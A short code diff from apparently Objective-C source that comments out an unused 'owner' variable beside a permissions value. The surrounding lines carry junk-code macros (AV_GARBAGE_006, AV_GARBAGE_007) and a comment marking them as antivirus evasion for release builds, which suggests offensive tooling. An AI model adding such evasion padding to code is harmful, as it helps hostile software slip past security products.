@@ -50,7 +50,7 @@
   AV_GARBAGE_007
   
   NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
-  NSValue *owner      = [NSNumber numberWithInt: 0];
+  //NSValue *owner      = [NSNumber numberWithInt: 0];  // J: unused
   
   // AV evasion: only on release build
   AV_GARBAGE_006
